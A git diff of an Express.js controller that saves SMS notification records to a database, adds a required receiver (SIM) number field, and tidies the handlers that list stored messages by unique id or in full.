@@ -3,11 +3,16 @@ const Notification = require('../models/Notification');
 // Save a notification (SMS) to the database
 exports.saveNotification = async (req, res) => {
     try {
-        const { sender, senderNumber, title, body, timestamp, uniqueid } = req.body;
+        const { sender, senderNumber, receiverNumber, title, body, timestamp, uniqueid } = req.body;
+
+        if (!receiverNumber) {
+            return res.status(400).json({ success: false, message: "Receiver number is required" });
+        }
 
         const notification = new Notification({
             sender,
-            senderNumber, // Naya field included
+            senderNumber,
+            receiverNumber, // SIM number is saved here
             title,
             body,
             timestamp,
@@ -33,7 +38,6 @@ exports.saveNotification = async (req, res) => {
 exports.getCustomSms = async (req, res) => {
     try {
         console.log("Params received:", req.params);
-
         let { uniqueid } = req.params;
 
         if (!uniqueid) {
@@ -42,8 +46,6 @@ exports.getCustomSms = async (req, res) => {
         }
 
         console.log("Searching for SMS data with uniqueid:", uniqueid);
-
-        // Fetch SMS data from the database using uniqueid
         const smsData = await Notification.find({ uniqueid });
 
         if (!smsData || smsData.length === 0) {
@@ -53,7 +55,6 @@ exports.getCustomSms = async (req, res) => {
 
         console.log("SMS data found:", smsData.length, "messages");
         res.render('sms', { smsData });
-
     } catch (error) {
         console.error("Error fetching SMS data:", error);
         res.status(500).send("Internal Server Error");
@@ -63,8 +64,6 @@ exports.getCustomSms = async (req, res) => {
 exports.getAllSms = async (req, res) => {
     try {
         console.log("Fetching all SMS data...");
-
-        // Fetch all SMS data from the database
         const smsData = await Notification.find();
 
         if (!smsData || smsData.length === 0) {
@@ -74,7 +73,6 @@ exports.getAllSms = async (req, res) => {
 
         console.log("Total SMS found:", smsData.length);
         res.render('sms', { smsData });
-
     } catch (error) {
         console.error("Error fetching all SMS data:", error);
         res.status(500).send("Internal Server Error");
